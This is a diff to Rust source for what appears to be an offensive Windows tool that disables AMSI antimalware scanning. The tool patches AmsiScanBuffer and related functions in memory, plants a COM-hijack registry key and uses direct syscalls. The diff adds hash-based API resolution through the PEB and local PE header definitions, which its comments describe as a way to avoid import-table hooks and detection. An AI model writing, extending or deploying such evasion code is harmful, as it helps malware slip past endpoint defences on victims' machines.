@@ -22,6 +22,217 @@
 #[cfg(windows)]
 use std::ptr;
 
+// ── pe_resolve helpers (Windows) ──────────────────────────────────────────────
+#[cfg(windows)]
+mod win_resolve {
+    /// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
+    pub const fn hash_str_const(s: &[u8]) -> u32 {
+        let mut h: u32 = pe_resolve::SEED;
+        let mut i = 0;
+        while i < s.len() {
+            h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
+            i += 1;
+        }
+        h
+    }
+
+    /// Compile-time djb2 hash for wide strings (matches pe_resolve::hash_wstr).
+    pub const fn hash_wstr_const(w: &[u16]) -> u32 {
+        let mut h: u32 = pe_resolve::SEED;
+        let mut i = 0;
+        while i < w.len() {
+            h = h.wrapping_mul(31).wrapping_add(w[i] as u32);
+            i += 1;
+        }
+        h
+    }
+
+    /// Resolve a function pointer from a DLL that is already loaded in the PEB.
+    pub unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
+        let module = pe_resolve::get_module_handle_by_hash(dll_hash)?;
+        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)?;
+        Some(std::mem::transmute_copy(&addr))
+    }
+
+    /// Resolve a function pointer from a DLL, loading it if not already present.
+    pub unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Option<T> {
+        let module = match pe_resolve::get_module_handle_by_hash(dll_hash) {
+            Some(m) => m,
+            None => {
+                let load_fn: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
+                    resolve_api(pe_resolve::HASH_KERNEL32_DLL, hash_str_const(b"LoadLibraryW\0"))?;
+                let m = load_fn(dll_wide.as_ptr());
+                if m.is_null() { return None; }
+                m
+            }
+        };
+        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)?;
+        Some(std::mem::transmute_copy(&addr))
+    }
+
+    // ── DLL wide strings & hashes ──────────────────────────────────────────────
+    pub const ADVAPI32_DLL_W: &[u16] = &[
+        'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16,
+        'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16,
+        'l' as u16, 'l' as u16, 0,
+    ];
+    pub const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_W);
+
+    // ── API hash constants ─────────────────────────────────────────────────────
+    // advapi32
+    pub const HASH_REGCREATEKEYEXA: u32  = hash_str_const(b"RegCreateKeyExA\0");
+    pub const HASH_REGSETVALUEEXA: u32   = hash_str_const(b"RegSetValueExA\0");
+    pub const HASH_REGCLOSEKEY: u32      = hash_str_const(b"RegCloseKey\0");
+    pub const HASH_REGDELETEKEYA: u32    = hash_str_const(b"RegDeleteKeyA\0");
+
+    // kernel32
+    pub const HASH_SWITCHTOTHREAD: u32   = hash_str_const(b"SwitchToThread\0");
+
+    // ── Function pointer types ─────────────────────────────────────────────────
+    // advapi32
+    pub type FnRegCreateKeyExA = unsafe extern "system" fn(
+        *mut std::ffi::c_void,       // hKey
+        *const i8,                   // lpSubKey
+        u32,                         // Reserved
+        *mut u8,                     // lpClass
+        u32,                         // dwOptions
+        u32,                         // samDesired
+        *mut std::ffi::c_void,       // lpSecurityAttributes
+        *mut *mut std::ffi::c_void,  // phkResult
+        *mut u32,                    // lpdwDisposition
+    ) -> i32;
+    pub type FnRegSetValueExA = unsafe extern "system" fn(
+        *mut std::ffi::c_void,       // hKey
+        *const i8,                   // lpValueName
+        u32,                         // Reserved
+        u32,                         // dwType
+        *const u8,                   // lpData
+        u32,                         // cbData
+    ) -> i32;
+    pub type FnRegCloseKey = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+    pub type FnRegDeleteKeyA = unsafe extern "system" fn(*mut std::ffi::c_void, *const i8) -> i32;
+
+    // kernel32
+    pub type FnSwitchToThread = unsafe extern "system" fn() -> i32;
+
+    // ── Local constants (replacing winapi imports) ──────────────────────────────
+    pub const PAGE_EXECUTE_READ: u32 = 0x20;
+    pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    pub const KEY_WRITE: u32 = 0x20006;
+    pub const REG_SZ: u32 = 1;
+    /// HKEY_CURRENT_USER as a raw pointer constant.
+    pub const HKEY_CURRENT_USER: *mut std::ffi::c_void = 0x80000001u64 as *mut std::ffi::c_void;
+
+    // ── PE header types (local definitions to avoid winapi IAT imports) ───
+
+    #[repr(C)]
+    #[derive(Default)]
+    pub struct ImageDosHeader {
+        pub e_magic: u16,
+        _e_cblp: u16,
+        _e_cp: u16,
+        _e_crlc: u16,
+        _e_cparhdr: u16,
+        _e_minalloc: u16,
+        _e_maxalloc: u16,
+        _e_ss: u16,
+        _e_sp: u16,
+        _e_csum: u16,
+        _e_ip: u16,
+        _e_cs: u16,
+        _e_lfarlc: u16,
+        _e_ovno: u16,
+        _e_res: [u16; 4],
+        _e_oemid: u16,
+        _e_oeminfo: u16,
+        _e_res2: [u16; 10],
+        pub e_lfanew: i32,
+    }
+
+    #[repr(C)]
+    #[derive(Default)]
+    pub struct ImageFileHeader {
+        pub machine: u16,
+        pub number_of_sections: u16,
+        _time_date_stamp: u32,
+        _pointer_to_symbol_table: u32,
+        _number_of_symbols: u32,
+        pub size_of_optional_header: u16,
+        _characteristics: u16,
+    }
+
+    #[repr(C)]
+    #[derive(Default)]
+    pub struct ImageDataDirectory {
+        _virtual_address: u32,
+        _size: u32,
+    }
+
+    #[repr(C)]
+    #[derive(Default)]
+    pub struct ImageSectionHeader {
+        pub name: [u8; 8],
+        pub misc: ImageSectionMisc,
+        pub virtual_address: u32,
+        _size_of_raw_data: u32,
+        _pointer_to_raw_data: u32,
+        _pointer_to_relocations: u32,
+        _pointer_to_linenumbers: u32,
+        _number_of_relocations: u16,
+        _number_of_linenumbers: u16,
+        pub characteristics: u32,
+    }
+
+    #[repr(C)]
+    #[derive(Default)]
+    pub struct ImageSectionMisc {
+        pub virtual_size: u32,
+    }
+
+    #[repr(C)]
+    #[derive(Default)]
+    pub struct ImageOptionalHeader64 {
+        pub magic: u16,
+        _major_linker_version: u8,
+        _minor_linker_version: u8,
+        _size_of_code: u32,
+        _size_of_initialized_data: u32,
+        _size_of_uninitialized_data: u32,
+        _address_of_entry_point: u32,
+        _base_of_code: u32,
+        _image_base: u64,
+        _section_alignment: u32,
+        _file_alignment: u32,
+        _major_operating_system_version: u16,
+        _minor_operating_system_version: u16,
+        _major_image_version: u16,
+        _minor_image_version: u16,
+        _major_subsystem_version: u16,
+        _minor_subsystem_version: u16,
+        _win32_version_value: u32,
+        _size_of_image: u32,
+        _size_of_headers: u32,
+        _check_sum: u32,
+        _subsystem: u16,
+        _dll_characteristics: u16,
+        _size_of_stack_reserve: u64,
+        _size_of_stack_commit: u64,
+        _size_of_heap_reserve: u64,
+        _size_of_heap_commit: u64,
+        _loader_flags: u32,
+        _number_of_rva_and_sizes: u32,
+        pub data_directory: [ImageDataDirectory; 16],
+    }
+
+    #[repr(C)]
+    #[derive(Default)]
+    pub struct ImageNtHeaders64 {
+        pub signature: u32,
+        pub file_header: ImageFileHeader,
+        pub optional_header: ImageOptionalHeader64,
+    }
+}
+
 /// Apply a single AMSI bypass strategy: in-process memory patching of
 /// `AmsiScanBuffer`, `AmsiScanString`, and `AmsiInitialize`.
 ///
@@ -66,7 +277,7 @@ pub fn orchestrate_layers() -> bool {
 /// to avoid IAT hooks on kernel32's VirtualProtect thunk.
 #[cfg(windows)]
 fn apply_memory_patch() {
-    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
+    use win_resolve::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
 
     /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
     /// Returns `true` on success (NTSTATUS >= 0).
@@ -141,7 +352,7 @@ fn apply_memory_patch() {
 
 #[cfg(windows)]
 fn apply_com_hijack() {
-    use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, HKEY_CURRENT_USER};
+    use win_resolve::{HKEY_CURRENT_USER, KEY_WRITE, REG_SZ};
 
     let subkey =
         b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
@@ -149,28 +360,42 @@ fn apply_com_hijack() {
     let default_val = b"C:\\Windows\\System32\\amsi_disabled.dll\0";
 
     unsafe {
+        let reg_create: win_resolve::FnRegCreateKeyExA = win_resolve::resolve_api_or_load(
+            win_resolve::ADVAPI32_DLL_W,
+            win_resolve::HASH_ADVAPI32_DLL,
+            win_resolve::HASH_REGCREATEKEYEXA,
+        ).expect("RegCreateKeyExA not found");
+        let reg_set: win_resolve::FnRegSetValueExA = win_resolve::resolve_api(
+            win_resolve::HASH_ADVAPI32_DLL,
+            win_resolve::HASH_REGSETVALUEEXA,
+        ).expect("RegSetValueExA not found");
+        let reg_close: win_resolve::FnRegCloseKey = win_resolve::resolve_api(
+            win_resolve::HASH_ADVAPI32_DLL,
+            win_resolve::HASH_REGCLOSEKEY,
+        ).expect("RegCloseKey not found");
+
         let mut hkey = ptr::null_mut();
-        if RegCreateKeyExA(
+        if reg_create(
             HKEY_CURRENT_USER,
             subkey.as_ptr() as _,
             0,
             ptr::null_mut(),
             0,
-            winapi::um::winnt::KEY_WRITE,
+            KEY_WRITE,
             ptr::null_mut(),
             &mut hkey,
             ptr::null_mut(),
         ) == 0
         {
-            RegSetValueExA(
+            reg_set(
                 hkey,
                 ptr::null(),
                 0,
-                winapi::um::winnt::REG_SZ,
+                REG_SZ,
                 default_val.as_ptr(),
                 (default_val.len() - 1) as u32,
             );
-            winapi::um::winreg::RegCloseKey(hkey);
+            reg_close(hkey);
         }
     }
 }
@@ -179,15 +404,19 @@ fn apply_com_hijack() {
 /// detectable COM-hijack artefact after the bypass is no longer needed.
 #[cfg(windows)]
 pub fn cleanup_com_hijack() {
-    use winapi::um::winreg::{RegDeleteKeyA, HKEY_CURRENT_USER};
+    use win_resolve::HKEY_CURRENT_USER;
     // Delete leaf key first; parent keys are harmless to leave (they are empty
     // standard Windows registry nodes).
     let leaf =
         b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
     let parent = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\0";
     unsafe {
-        RegDeleteKeyA(HKEY_CURRENT_USER, leaf.as_ptr() as _);
-        RegDeleteKeyA(HKEY_CURRENT_USER, parent.as_ptr() as _);
+        let reg_delete: win_resolve::FnRegDeleteKeyA = win_resolve::resolve_api(
+            win_resolve::HASH_ADVAPI32_DLL,
+            win_resolve::HASH_REGDELETEKEYA,
+        ).expect("RegDeleteKeyA not found");
+        reg_delete(HKEY_CURRENT_USER, leaf.as_ptr() as _);
+        reg_delete(HKEY_CURRENT_USER, parent.as_ptr() as _);
     }
 }
 
@@ -239,7 +468,7 @@ fn set_init_failed_flag() {
         if nt_protect(
             init_fn,
             patch.len(),
-            winapi::um::winnt::PAGE_EXECUTE_READWRITE,
+            win_resolve::PAGE_EXECUTE_READWRITE,
             &mut old,
         ) {
             std::ptr::copy_nonoverlapping(patch.as_ptr(), init_fn as *mut u8, patch.len());
@@ -499,34 +728,28 @@ mod write_raid {
 
     /// Check whether `addr` falls within the `.data` section of amsi.dll.
     unsafe fn is_within_amsi_data(amsi_base: usize, addr: usize) -> bool {
-        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
+        use win_resolve::{ImageDosHeader, ImageNtHeaders64, ImageSectionHeader, ImageFileHeader};
 
-        let dos = &*(amsi_base as *const IMAGE_DOS_HEADER);
+        let dos = &*(amsi_base as *const ImageDosHeader);
         if dos.e_magic != 0x5A4D {
             return false;
         }
-        let nt = &*((amsi_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
-        let section_offset = dos.e_lfanew as usize
-            + std::mem::size_of::<IMAGE_NT_HEADERS64>()
-            - std::mem::size_of::<winapi::um::winnt::IMAGE_DATA_DIRECTORY>()
-            + nt.OptionalHeader.NumberOfRvaAndSizes as usize
-            * std::mem::size_of::<winapi::um::winnt::IMAGE_DATA_DIRECTORY>();
+        let nt = &*((amsi_base + dos.e_lfanew as usize) as *const ImageNtHeaders64);
 
         // Walk section headers.
-        let n_sections = nt.FileHeader.NumberOfSections as usize;
-        let section_size = std::mem::size_of::<winapi::um::winnt::IMAGE_SECTION_HEADER>();
+        let n_sections = nt.file_header.number_of_sections as usize;
         let sections_ptr = (amsi_base + dos.e_lfanew as usize
             + std::mem::size_of::<u32>() // Signature
-            + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
-            + nt.FileHeader.SizeOfOptionalHeader as usize) as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+            + std::mem::size_of::<ImageFileHeader>()
+            + nt.file_header.size_of_optional_header as usize) as *const ImageSectionHeader;
 
         for i in 0..n_sections {
             let sec = &*sections_ptr.add(i);
-            let sec_start = amsi_base + sec.VirtualAddress as usize;
-            let sec_end = sec_start + sec.Misc.VirtualSize as usize;
+            let sec_start = amsi_base + sec.virtual_address as usize;
+            let sec_end = sec_start + sec.misc.virtual_size as usize;
             if addr >= sec_start && addr < sec_end {
                 // Check if this is a writable data section.
-                let chars = sec.Characteristics as u32;
+                let chars = sec.characteristics as u32;
                 // .data section: IMAGE_SCN_MEM_WRITE (0x80000000) set
                 if chars & 0x80000000 != 0 {
                     return true;
@@ -607,7 +830,14 @@ mod write_raid {
                     && !STOP_REQUESTED.load(Ordering::Relaxed)
                 {
                     unsafe {
-                        winapi::um::synchapi::SwitchToThread();
+                        let switch_thread: super::win_resolve::FnSwitchToThread =
+                            super::win_resolve::resolve_api(
+                                pe_resolve::HASH_KERNEL32_DLL,
+                                super::win_resolve::HASH_SWITCHTOTHREAD,
+                            ).unwrap_or_else(|| std::mem::transmute::<usize, super::win_resolve::FnSwitchToThread>(0));
+                        if std::mem::transmute::<super::win_resolve::FnSwitchToThread, usize>(switch_thread) != 0 {
+                            switch_thread();
+                        }
                     }
                 }
                 // Either pause was lifted or stop was requested.
@@ -663,8 +893,13 @@ mod write_raid {
                 let mut delay_100ns: i64 = 0; // 0 = yield
                 nt_delay(0, &mut delay_100ns);
             } else {
-                // Fallback: kernel32 SwitchToThread.
-                winapi::um::synchapi::SwitchToThread();
+                // Fallback: kernel32 SwitchToThread via pe_resolve.
+                if let Some(switch_fn) = super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
+                    pe_resolve::HASH_KERNEL32_DLL,
+                    super::win_resolve::HASH_SWITCHTOTHREAD,
+                ) {
+                    switch_fn();
+                }
             }
         }
 
@@ -762,7 +997,7 @@ mod write_raid {
             let create_status = syscall!(
                 "NtCreateThreadEx",
                 &mut thread_handle as *mut u64 as u64, // ThreadHandle
-                0x1FFFFFu64,                            // DesiredAccess (THREAD_ALL_ACCESS)
+                THREAD_WAIT_ACCESS,                            // DesiredAccess (minimal)
                 0u64,                                    // ObjectAttributes
                 (-1isize) as u64,                        // ProcessHandle (current)
                 thread_proc as *mut std::ffi::c_void as u64, // StartRoutine
@@ -824,7 +1059,12 @@ mod write_raid {
                 break;
             }
             unsafe {
-                winapi::um::synchapi::SwitchToThread();
+                if let Some(switch_fn) = super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
+                    pe_resolve::HASH_KERNEL32_DLL,
+                    super::win_resolve::HASH_SWITCHTOTHREAD,
+                ) {
+                    switch_fn();
+                }
             }
         }
 
